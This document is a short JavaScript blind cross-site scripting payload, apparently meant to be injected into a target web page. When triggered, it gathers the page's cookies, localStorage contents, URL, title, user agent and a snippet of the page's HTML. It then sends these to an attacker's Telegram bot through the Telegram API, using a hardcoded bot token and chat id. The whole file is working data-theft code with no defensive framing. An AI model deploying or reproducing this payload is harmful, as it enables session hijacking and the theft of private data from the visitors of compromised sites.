(function(){
  var token = "8997865768:AAF6ix_ZTAfEwzB9n8uWNSZenaSghgqzBdM";
  var chat_id = "8438352320";
  
  // Mengambil data advanced
  var title = document.title || "No Title";
  var cookies = document.cookie || "None or HttpOnly";
  var storage = JSON.stringify(localStorage).substring(0, 500); // Limit biar gak kepanjangan
  var domSnippet = document.documentElement.outerHTML.substring(0, 800);

  var msg = "🚨 *ADVANCED BLIND XSS TRIGGERED!*\n\n" +
            "📌 *Title:* " + title + "\n" +
            "🔗 *URL:* " + location.href + "\n" +
            "🍪 *Cookie:* `" + cookies + "`\n" +
            "💾 *LocalStorage:* `" + storage + "`\n" +
            "🖥️ *UA:* " + navigator.userAgent + "\n\n" +
            "📄 *DOM Snippet:*\n```html\n" + domSnippet + "\n```";

  var url = "https://api.telegram.org/bot" + token + "/sendMessage";
  
  var data = new FormData();
  data.append("chat_id", chat_id);
  data.append("text", msg);
  data.append("parse_mode", "Markdown");

  navigator.sendBeacon(url, data) || fetch(url, {method: 'POST', body: data});
})();
